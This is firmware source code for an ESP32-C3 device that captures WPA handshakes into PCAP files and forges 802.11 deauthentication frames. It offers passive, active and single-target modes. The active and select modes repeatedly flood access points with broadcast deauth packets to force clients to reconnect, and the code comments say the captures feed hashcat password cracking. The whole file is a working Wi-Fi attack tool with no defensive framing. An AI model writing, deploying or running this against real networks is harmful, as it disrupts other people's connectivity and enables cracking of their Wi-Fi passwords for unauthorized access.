#include "pcap.h"

#ifdef CONFIG_IDF_TARGET_ESP32C3

#include <WiFi.h>
#include <SPIFFS.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "display.h"

extern U8G2_SSD1306_72X40_ER_F_HW_I2C u8g2;

// ==================== GLOBAL VARIABLES ====================
static PcapMode currentMode = PCAP_PASSIVE;
static PcapStatus pcapStatus = PCAP_IDLE;
static bool pcapRunning = false;
static bool pcapScanning = false;

static uint8_t currentChannel = 1;
static uint32_t lastChannelHop = 0;
static uint32_t channelStartTime = 0;
static uint32_t lastDeauthTime = 0;  // For SELECT mode repeated deauth
static uint32_t packetCount = 0;
static uint32_t deauthCount = 0;
static bool deauthSent = false;  // Track if deauth sent for current channel
static uint8_t cycleCount = 0;   // Track scan cycles for ACTIVE mode

// SELECT mode variables
static bool selectMode = false;
static uint8_t targetChannel = 0;
static uint8_t targetBSSID[6] = {0};
static PcapAPInfo apList[PCAP_MAX_APS];
static int apCount = 0;

// ACTIVE mode: Track channels with APs
static uint8_t activeChannels[PCAP_MAX_CHANNELS];
static int activeChannelCount = 0;
static int activeChannelIndex = 0;

static HandshakeInfo handshakes[PCAP_MAX_HANDSHAKES];
static uint8_t handshakeCount = 0;

static File pcapFile;
static bool fileOpen = false;
static char currentFilename[32] = "";
static int fileCounter = 1;

// ==================== PCAP FILE HEADER ====================
typedef struct {
    uint32_t magic_number;   // 0xa1b2c3d4
    uint16_t version_major;  // 2
    uint16_t version_minor;  // 4
    int32_t  thiszone;       // 0
    uint32_t sigfigs;        // 0
    uint32_t snaplen;        // 65535
    uint32_t network;        // 105 (IEEE 802.11)
} pcap_hdr_t;

typedef struct {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} pcaprec_hdr_t;

// ==================== DEAUTH PACKET ====================
static uint8_t deauthPacket[26] = {
    0xc0, 0x00,                         // Type/Subtype: Deauthentication
    0x00, 0x00,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP BSSID)
    0x00, 0x00,                         // Sequence
    0x07, 0x00                          // Reason: Class 3 frame from nonassoc STA
};

// ==================== FILE MANAGEMENT ====================
String getUniqueFilename(const char* baseFilename) {
    // Check if base filename exists
    String filename = String(baseFilename);
    
    if (!SPIFFS.exists(filename)) {
        return filename;
    }
    
    // Extract name and extension
    int dotPos = filename.lastIndexOf('.');
    String name = filename.substring(0, dotPos);
    String ext = filename.substring(dotPos);
    
    // Try (2), (3), etc.
    for (int i = 2; i < 100; i++) {
        String newFilename = name + "(" + String(i) + ")" + ext;
        if (!SPIFFS.exists(newFilename)) {
            return newFilename;
        }
    }
    
    // Fallback: use timestamp
    return name + "_" + String(millis()) + ext;
}

void openNewPcapFile(const char* baseFilename) {
    // Close existing file if open
    if (fileOpen && pcapFile) {
        pcapFile.close();
        Serial.printf("[PCAP] Closed: %s\n", currentFilename);
    }
    
    // Check SPIFFS space
    size_t totalBytes = SPIFFS.totalBytes();
    size_t usedBytes = SPIFFS.usedBytes();
    size_t freeBytes = totalBytes - usedBytes;
    
    Serial.printf("[PCAP] SPIFFS: %d/%d KB free\n", freeBytes / 1024, totalBytes / 1024);
    
    // Warn if low space
    if (freeBytes < 50000) {
        Serial.println("[PCAP] WARNING: Low SPIFFS space!");
        Serial.println("[PCAP] Consider deleting old files via WEB FILES");
    }
    
    // Get unique filename
    String uniqueFilename = getUniqueFilename(baseFilename);
    strncpy(currentFilename, uniqueFilename.c_str(), sizeof(currentFilename) - 1);
    currentFilename[sizeof(currentFilename) - 1] = '\0';
    
    // Open new file
    pcapFile = SPIFFS.open(currentFilename, "w");
    
    if (pcapFile) {
        fileOpen = true;
        
        // Write PCAP header
        pcap_hdr_t hdr;
        hdr.magic_number = 0xa1b2c3d4;
        hdr.version_major = 2;
        hdr.version_minor = 4;
        hdr.thiszone = 0;
        hdr.sigfigs = 0;
        hdr.snaplen = 65535;
        hdr.network = 105; // IEEE 802.11
        
        pcapFile.write((uint8_t*)&hdr, sizeof(pcap_hdr_t));
        pcapFile.flush();
        
        Serial.printf("[PCAP] File opened: %s\n", currentFilename);
    } else {
        fileOpen = false;
        Serial.println("[PCAP] ERROR: Failed to open file");
        Serial.println("[PCAP] Possible causes:");
        Serial.println("[PCAP]   - SPIFFS full (delete old files)");
        Serial.println("[PCAP]   - Too many files (max ~100)");
        Serial.println("[PCAP]   - Filename too long");
    }
}

// ==================== WIFI PROMISCUOUS CALLBACK ====================
void pcapPacketHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
    // Check heap before processing
    if (ESP.getFreeHeap() < 10000) {
        return;
    }
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    
    // Validate packet length
    if (len < 24 || len > 2346) return;
    
    // Frame Control Field (first 2 bytes)
    uint8_t frameType = (payload[0] & 0x0C) >> 2;
    uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;
    
    bool isEAPOL = false;
    int eapolOffset = -1;
    
    // Check for DATA frames (type 2) - EAPOL is in data frames
    if (frameType == 2) {
        // Data frame structure:
        // 0-1: Frame Control
        // 2-3: Duration
        // 4-9: Address 1 (Receiver)
        // 10-15: Address 2 (Transmitter)
        // 16-21: Address 3 (BSSID)
        // 22-23: Sequence Control
        // 24+: LLC/SNAP header (8 bytes) + payload
        
        // Check for QoS Data (subtype 8)
        int dataOffset = 24;
        if (frameSubtype == 8) {
            dataOffset = 26; // QoS adds 2 bytes
        }
        
        // LLC/SNAP header check for EAPOL (0x888e)
        // LLC: AA AA 03 (SNAP)
        // OUI: 00 00 00
        // Type: 88 8e (EAPOL)
        if (len > dataOffset + 8) {
            if (payload[dataOffset] == 0xAA && 
                payload[dataOffset + 1] == 0xAA && 
                payload[dataOffset + 2] == 0x03 &&
                payload[dataOffset + 6] == 0x88 && 
                payload[dataOffset + 7] == 0x8e) {
                isEAPOL = true;
                eapolOffset = dataOffset + 8;
            }
        }
    }
    
    packetCount++;
    
    // Process EAPOL packets (WPA handshake)
    if (isEAPOL && eapolOffset > 0) {
        // Extract BSSID (Address 3, bytes 16-21)
        uint8_t bssid[6];
        memcpy(bssid, &payload[16], 6);
        
        // Find or create handshake entry
        int idx = -1;
        for (int i = 0; i < handshakeCount; i++) {
            if (memcmp(handshakes[i].bssid, bssid, 6) == 0) {
                idx = i;
                break;
            }
        }
        
        // Create new entry if not found
        if (idx == -1 && handshakeCount < PCAP_MAX_HANDSHAKES) {
            idx = handshakeCount++;
            memcpy(handshakes[idx].bssid, bssid, 6);
            handshakes[idx].channel = currentChannel;
            handshakes[idx].messageFlags = 0;
            handshakes[idx].timestamp = millis();
            handshakes[idx].complete = false;
            snprintf(handshakes[idx].ssid, 33, "CH%d", currentChannel);
            
            Serial.printf("[PCAP] New HS: %02X:%02X:%02X:%02X:%02X:%02X CH%d\n",
                         bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                         currentChannel);
        }
        
        // Parse EAPOL Key frame
        if (idx >= 0 && len > eapolOffset + 6) {
            // EAPOL structure:
            // 0: Protocol Version
            // 1: Packet Type (3 = Key)
            // 2-3: Packet Body Length
            // 4: Descriptor Type (2 = EAPOL RSN Key)
            // 5-6: Key Information
            
            uint8_t packetType = payload[eapolOffset + 1];
            
            if (packetType == 3 && len > eapolOffset + 6) { // Key frame
                // Key Information field (2 bytes, big endian)
                uint16_t keyInfo = (payload[eapolOffset + 5] << 8) | payload[eapolOffset + 6];
                
                // Bit flags in Key Information:
                // Bit 3 (0x0008): Pairwise key
                // Bit 6 (0x0040): Install flag
                // Bit 7 (0x0080): ACK flag (set = from AP)
                // Bit 8 (0x0100): MIC flag
                
                bool isPairwise = (keyInfo & 0x0008) != 0;
                bool hasInstall = (keyInfo & 0x0040) != 0;
                bool hasAck = (keyInfo & 0x0080) != 0;
                bool hasMic = (keyInfo & 0x0100) != 0;
                
                // Detect message type:
                // M1: Pairwise, ACK, no MIC, no Install
                // M2: Pairwise, MIC, no ACK
                // M3: Pairwise, ACK, MIC, Install
                // M4: Pairwise, MIC, no ACK, no Install
                
                if (isPairwise) {
                    if (hasAck && !hasMic && !hasInstall) {
                        // Message 1
                        if (!(handshakes[idx].messageFlags & 0x01)) {
                            handshakes[idx].messageFlags |= 0x01;
                            Serial.printf("[PCAP] M1 CH%d\n", currentChannel);
                        }
                    } else if (!hasAck && hasMic && !hasInstall) {
                        // Message 2 or 4
                        // Check if M1 exists to determine M2 vs M4
                        if ((handshakes[idx].messageFlags & 0x01) && !(handshakes[idx].messageFlags & 0x02)) {
                            handshakes[idx].messageFlags |= 0x02;
                            Serial.printf("[PCAP] M2 CH%d\n", currentChannel);
                        } else if ((handshakes[idx].messageFlags & 0x04) && !(handshakes[idx].messageFlags & 0x08)) {
                            handshakes[idx].messageFlags |= 0x08;
                            Serial.printf("[PCAP] M4 CH%d\n", currentChannel);
                        }
                    } else if (hasAck && hasMic && hasInstall) {
                        // Message 3
                        if (!(handshakes[idx].messageFlags & 0x04)) {
                            handshakes[idx].messageFlags |= 0x04;
                            Serial.printf("[PCAP] M3 CH%d\n", currentChannel);
                        }
                    }
                }
                
                // Check if complete (has all 4 messages)
                if (handshakes[idx].messageFlags == 0x0F && !handshakes[idx].complete) {
                    handshakes[idx].complete = true;
                    Serial.println("[PCAP] ========================================");
                    Serial.printf("[PCAP] ✓ COMPLETE HANDSHAKE #%d! CH%d\n", handshakeCount, currentChannel);
                    Serial.printf("[PCAP] BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                    Serial.println("[PCAP] Continuing capture in same file...");
                    Serial.println("[PCAP] ========================================");
                    
                    // Don't rotate file - keep capturing multiple handshakes in one file
                    // This allows hashcat to crack multiple APs from single PCAP
                }
            }
        }
    }
    
    // Write ALL packets to PCAP file (not just EAPOL)
    // This ensures we capture beacons and other frames needed for cracking
    if (fileOpen) {
        pcaprec_hdr_t pkthdr;
        pkthdr.ts_sec = millis() / 1000;
        pkthdr.ts_usec = (millis() % 1000) * 1000;
        pkthdr.incl_len = len;
        pkthdr.orig_len = len;
        
        pcapFile.write((uint8_t*)&pkthdr, sizeof(pcaprec_hdr_t));
        pcapFile.write(payload, len);
        
        // Flush every 10 packets
        static uint8_t flushCounter = 0;
        if (++flushCounter >= 10) {
            pcapFile.flush();
            flushCounter = 0;
        }
    }
}

// ==================== INITIALIZATION ====================
void initPcap() {
    handshakeCount = 0;
    packetCount = 0;
    deauthCount = 0;
    pcapRunning = false;
    pcapScanning = false;
    pcapStatus = PCAP_IDLE;
    selectMode = false;
    targetChannel = 0;
    apCount = 0;
    fileCounter = 1;
    
    // Check SPIFFS status
    size_t totalBytes = SPIFFS.totalBytes();
    size_t usedBytes = SPIFFS.usedBytes();
    size_t freeBytes = totalBytes - usedBytes;
    
    Serial.println("[PCAP] Initialized");
    Serial.printf("[PCAP] SPIFFS: %d KB total, %d KB used, %d KB free\n", 
                 totalBytes / 1024, usedBytes / 1024, freeBytes / 1024);
    
    if (freeBytes < 50000) {
        Serial.println("[PCAP] WARNING: Low SPIFFS space!");
    }
}

// ==================== AP SCANNING (for SELECT mode) ====================
void pcapScanAllAPs() {
    apCount = 0;
    activeChannelCount = 0;
    
    Serial.println("[PCAP] ========================================");
    Serial.println("[PCAP] Deep scanning all channels for APs...");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    // Show scanning animation on display
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(8, 8, "SCANNING");
    u8g2.drawHLine(0, 10, 72);
    u8g2.setFont(u8g2_font_4x6_tr);
    u8g2.drawStr(4, 20, "Deep Scan");
    u8g2.drawStr(4, 28, "~5 sec...");
    u8g2.sendBuffer();
    
    // DEEP SCAN: 450ms per channel = ~5 seconds total for 11 channels
    // show_hidden=true to detect hidden SSIDs
    // This finds more APs including weak signals and hidden networks
    int n = WiFi.scanNetworks(false, true, false, 450);
    
    if (n > 0) {
        // Track which channels have APs
        bool channelHasAP[PCAP_MAX_CHANNELS + 1] = {false};
        
        for (int i = 0; i < n && apCount < PCAP_MAX_APS; i++) {
            String ssid = WiFi.SSID(i);
            
            // Handle Hidden SSID - show as "#HIDDEN"
            if (ssid.length() == 0) {
                strcpy(apList[apCount].ssid, "#HIDDEN");
            } else {
                strncpy(apList[apCount].ssid, ssid.c_str(), 32);
                apList[apCount].ssid[32] = '\0';
            }
            
            uint8_t* bssid = WiFi.BSSID(i);
            if (bssid) {
                memcpy(apList[apCount].bssid, bssid, 6);
            }
            
            apList[apCount].channel = WiFi.channel(i);
            apList[apCount].rssi = WiFi.RSSI(i);
            
            // Mark channel as having AP
            if (apList[apCount].channel >= 1 && apList[apCount].channel <= PCAP_MAX_CHANNELS) {
                channelHasAP[apList[apCount].channel] = true;
            }
            
            // Log hidden SSIDs
            if (ssid.length() == 0) {
                Serial.printf("[PCAP] Found #HIDDEN: %02X:%02X:%02X:%02X:%02X:%02X (CH:%d, RSSI:%d)\n",
                             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                             apList[apCount].channel, apList[apCount].rssi);
            }
            
            apCount++;
        }
        
        // Build list of active channels (channels with APs)
        for (int ch = 1; ch <= PCAP_MAX_CHANNELS; ch++) {
            if (channelHasAP[ch]) {
                activeChannels[activeChannelCount++] = ch;
            }
        }
        
        Serial.printf("[PCAP] Found %d APs on %d channels (including hidden)\n", apCount, activeChannelCount);
        Serial.print("[PCAP] Active channels: ");
        for (int i = 0; i < activeChannelCount; i++) {
            Serial.printf("%d ", activeChannels[i]);
        }
        Serial.println();
        
        // Show results on display
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_5x7_tr);
        u8g2.drawStr(8, 8, "SCAN DONE");
        u8g2.drawHLine(0, 10, 72);
        u8g2.setFont(u8g2_font_4x6_tr);
        
        char foundStr[20];
        snprintf(foundStr, sizeof(foundStr), "Found: %d APs", apCount);
        u8g2.drawStr(4, 20, foundStr);
        
        // Count hidden SSIDs
        int hiddenCount = 0;
        for (int i = 0; i < apCount; i++) {
            if (strcmp(apList[i].ssid, "#HIDDEN") == 0) {
                hiddenCount++;
            }
        }
        
        char channelStr[20];
        if (hiddenCount > 0) {
            snprintf(channelStr, sizeof(channelStr), "Hidden:%d CH:%d", hiddenCount, activeChannelCount);
        } else {
            snprintf(channelStr, sizeof(channelStr), "Channels: %d", activeChannelCount);
        }
        u8g2.drawStr(4, 28, channelStr);
        
        u8g2.drawStr(4, 36, "Ready!");
        u8g2.sendBuffer();
        delay(1500); // Shorter delay
    } else {
        Serial.println("[PCAP] No APs found");
        
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_5x7_tr);
        u8g2.drawStr(8, 20, "NO APs");
        u8g2.drawStr(8, 28, "FOUND");
        u8g2.sendBuffer();
        delay(1500);
    }
    
    WiFi.scanDelete();
    Serial.println("[PCAP] ========================================");
}

void startPcapAPScan() {
    pcapScanning = true;
    pcapScanAllAPs();
    pcapScanning = false;
}

bool isPcapScanning() {
    return pcapScanning;
}

int getPcapAPCount() {
    return apCount;
}

PcapAPInfo* getPcapAPList() {
    return apList;
}

// ==================== START CAPTURE ====================
void startPcapCapture(PcapMode mode) {
    startPcapCaptureWithTarget(mode, 0, nullptr);
}

void startPcapCaptureWithTarget(PcapMode mode, uint8_t targetCh, uint8_t* targetBSSIDPtr) {
    currentMode = mode;
    handshakeCount = 0;
    packetCount = 0;
    deauthCount = 0;
    lastChannelHop = millis();
    channelStartTime = millis();
    lastDeauthTime = 0;  // Reset for SELECT mode
    deauthSent = false;
    cycleCount = 0;
    
    // SELECT mode setup
    if (targetCh > 0 && targetBSSIDPtr != nullptr) {
        selectMode = true;
        targetChannel = targetCh;
        memcpy(targetBSSID, targetBSSIDPtr, 6);
        currentChannel = targetChannel;
        
        Serial.println("[PCAP] ========================================");
        Serial.printf("[PCAP] Starting SELECT mode\n");
        Serial.printf("[PCAP] Target: %02X:%02X:%02X:%02X:%02X:%02X\n",
                     targetBSSID[0], targetBSSID[1], targetBSSID[2],
                     targetBSSID[3], targetBSSID[4], targetBSSID[5]);
        Serial.printf("[PCAP] Channel: %d (LOCKED)\n", targetChannel);
        Serial.println("[PCAP] Deauth: 5 sec burst every 30 sec");
        Serial.println("[PCAP] ========================================");
    } else {
        selectMode = false;
        currentChannel = 1;
        activeChannelIndex = 0;
        
        // ACTIVE mode: Scan all APs first
        if (mode == PCAP_ACTIVE) {
            Serial.println("[PCAP] Pre-scanning for ACTIVE mode...");
            pcapScanAllAPs();
            
            // Start on first active channel
            if (activeChannelCount > 0) {
                currentChannel = activeChannels[0];
            } else {
                currentChannel = 1; // Fallback if no APs found
            }
        }
        
        Serial.println("[PCAP] ========================================");
        Serial.printf("[PCAP] Starting %s mode\n", 
                     mode == PCAP_PASSIVE ? "PASSIVE" : "ACTIVE");
        
        if (mode == PCAP_ACTIVE) {
            Serial.printf("[PCAP] Targets: %d APs on %d channels\n", apCount, activeChannelCount);
            Serial.print("[PCAP] Active channels: ");
            for (int i = 0; i < activeChannelCount; i++) {
                Serial.printf("%d ", activeChannels[i]);
            }
            Serial.println();
            Serial.println("[PCAP] Rescan: Every 2 cycles");
        } else {
            Serial.println("[PCAP] Channels: 1-11 (5 sec per channel)");
        }
        Serial.println("[PCAP] ========================================");
    }
    
    // Stop any existing WiFi
    WiFi.mode(WIFI_OFF);
    delay(100);
    
    // Start WiFi in promiscuous mode
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&pcapPacketHandler);
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    
    Serial.printf("[PCAP] Started on channel %d\n", currentChannel);
    
    // Open PCAP file with unique filename
    char filename[32];
    if (selectMode) {
        // SELECT mode: Single file with target BSSID (check for duplicates)
        snprintf(filename, sizeof(filename), "/sel_%02X%02X%02X.pcap", 
                targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    } else {
        // ACTIVE/PASSIVE: Single file per session with timestamp (check for duplicates)
        const char* prefix = (mode == PCAP_ACTIVE) ? "act" : "pas";
        snprintf(filename, sizeof(filename), "/%s_%lu.pcap", prefix, millis());
    }
    
    openNewPcapFile(filename);
    
    pcapRunning = true;
    pcapStatus = PCAP_CAPTURING;
}

// ==================== STOP CAPTURE ====================
void stopPcapCapture() {
    if (!pcapRunning) return;
    
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    
    if (fileOpen) {
        pcapFile.close();
        fileOpen = false;
        Serial.println("[PCAP] File closed");
    }
    
    pcapRunning = false;
    pcapStatus = PCAP_IDLE;
    
    Serial.println("[PCAP] ========================================");
    Serial.printf("[PCAP] Stopped. Total packets: %lu\n", packetCount);
    Serial.printf("[PCAP] Handshakes captured: %d\n", handshakeCount);
    
    // Show handshake details
    for (int i = 0; i < handshakeCount; i++) {
        Serial.printf("[PCAP] HS%d: CH%d, Flags:%d%d%d%d %s\n", 
                     i + 1,
                     handshakes[i].channel,
                     (handshakes[i].messageFlags & 0x01) ? 1 : 0,
                     (handshakes[i].messageFlags & 0x02) ? 1 : 0,
                     (handshakes[i].messageFlags & 0x04) ? 1 : 0,
                     (handshakes[i].messageFlags & 0x08) ? 1 : 0,
                     handshakes[i].complete ? "[COMPLETE]" : "");
    }
    
    if (currentMode == PCAP_ACTIVE) {
        Serial.printf("[PCAP] Deauth packets sent: %lu\n", deauthCount);
    }
    
    Serial.println("[PCAP] ========================================");
}

// ==================== UPDATE CAPTURE ====================
void updatePcapCapture() {
    if (!pcapRunning) return;
    
    uint32_t currentTime = millis();
    uint32_t timeOnChannel = currentTime - channelStartTime;
    
    // SELECT mode: Send deauth burst (5 sec) every 30 seconds
    if (selectMode && (lastDeauthTime == 0 || currentTime - lastDeauthTime >= PCAP_SELECT_DEAUTH_INTERVAL)) {
        lastDeauthTime = currentTime;
        
        Serial.printf("[PCAP] SELECT: Sending deauth burst (5 sec)...\n");
        
        // Send deauth continuously for 5 seconds
        uint32_t burstStart = millis();
        int burstCount = 0;
        
        while (millis() - burstStart < PCAP_SELECT_DEAUTH_DURATION) {
            // Set target BSSID in deauth packet
            memcpy(&deauthPacket[10], targetBSSID, 6); // Source (AP)
            memcpy(&deauthPacket[16], targetBSSID, 6); // BSSID (AP)
            
            esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
            deauthCount++;
            burstCount++;
            delay(PCAP_DEAUTH_BURST_DELAY);
        }
        
        Serial.printf("[PCAP] SELECT: Deauth burst complete (%d packets, total: %lu)\n", 
                     burstCount, deauthCount);
        Serial.println("[PCAP] SELECT: Waiting 30 seconds for reconnect...");
    }
    // ACTIVE mode: Send deauth burst (1 sec) at start of each channel
    else if (currentMode == PCAP_ACTIVE && !selectMode && !deauthSent && timeOnChannel > 200) {
        Serial.printf("[PCAP] CH%d: Sending deauth burst (1 sec)...\n", currentChannel);
        
        int sentCount = 0;
        uint32_t burstStart = millis();
        
        // Send deauth continuously for 1 second to all APs on this channel
        while (millis() - burstStart < PCAP_ACTIVE_DEAUTH_DURATION) {
            for (int i = 0; i < apCount; i++) {
                if (apList[i].channel == currentChannel) {
                    memcpy(&deauthPacket[10], apList[i].bssid, 6); // Source (AP)
                    memcpy(&deauthPacket[16], apList[i].bssid, 6); // BSSID (AP)
                    
                    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
                    deauthCount++;
                    sentCount++;
                }
            }
            delay(50); // Small delay between rounds
        }
        
        if (sentCount > 0) {
            Serial.printf("[PCAP] CH%d: Deauth burst complete (%d packets)\n", currentChannel, sentCount);
        }
        
        deauthSent = true;
    }
    
    // Channel hopping (5 seconds per channel) - skip if SELECT mode
    if (!selectMode && currentTime - lastChannelHop >= PCAP_CHANNEL_HOP_INTERVAL) {
        lastChannelHop = currentTime;
        channelStartTime = currentTime;
        deauthSent = false;
        
        if (currentMode == PCAP_ACTIVE && activeChannelCount > 0) {
            // ACTIVE mode: Hop only through channels with APs
            activeChannelIndex++;
            if (activeChannelIndex >= activeChannelCount) {
                activeChannelIndex = 0;
                cycleCount++;
                
                Serial.println("[PCAP] ========================================");
                Serial.printf("[PCAP] Cycle %d complete. HS: %d, PKT: %lu\n", 
                             cycleCount, handshakeCount, packetCount);
                Serial.println("[PCAP] ========================================");
                
                // ACTIVE mode: Fast rescan every 2 cycles
                if (cycleCount % PCAP_ACTIVE_RESCAN_CYCLES == 0) {
                    Serial.println("[PCAP] Deep rescanning APs (5 sec)...");
                    
                    // Temporarily disable promiscuous mode
                    esp_wifi_set_promiscuous(false);
                    
                    // Deep rescan
                    pcapScanAllAPs();
                    
                    // Re-enable promiscuous mode
                    esp_wifi_set_promiscuous(true);
                    esp_wifi_set_promiscuous_rx_cb(&pcapPacketHandler);
                    
                    // Start from first active channel
                    activeChannelIndex = 0;
                    if (activeChannelCount > 0) {
                        currentChannel = activeChannels[0];
                    }
                    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
                    Serial.printf("[PCAP] Rescan complete. Now on channel %d\n", currentChannel);
                    return; // Skip normal channel switch
                }
            }
            
            currentChannel = activeChannels[activeChannelIndex];
            Serial.printf("[PCAP] Switched to channel %d (%d/%d)\n", 
                         currentChannel, activeChannelIndex + 1, activeChannelCount);
        } else {
            // PASSIVE mode: Hop through all channels 1-11
            currentChannel++;
            if (currentChannel > PCAP_MAX_CHANNELS) {
                currentChannel = 1;
                cycleCount++;
                
                Serial.println("[PCAP] ========================================");
                Serial.printf("[PCAP] Cycle %d complete. HS: %d, PKT: %lu\n", 
                             cycleCount, handshakeCount, packetCount);
                Serial.println("[PCAP] ========================================");
            }
            
            Serial.printf("[PCAP] Switched to channel %d\n", currentChannel);
        }
        
        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    }
}

// ==================== GETTERS ====================
bool isPcapRunning() {
    return pcapRunning;
}

PcapMode getCurrentPcapMode() {
    return currentMode;
}

uint8_t getCurrentPcapChannel() {
    return currentChannel;
}

uint32_t getPcapPacketCount() {
    return packetCount;
}

uint8_t getHandshakeCount() {
    return handshakeCount;
}

HandshakeInfo* getHandshakeList() {
    return handshakes;
}

uint32_t getDeauthCount() {
    return deauthCount;
}

#endif // CONFIG_IDF_TARGET_ESP32C3
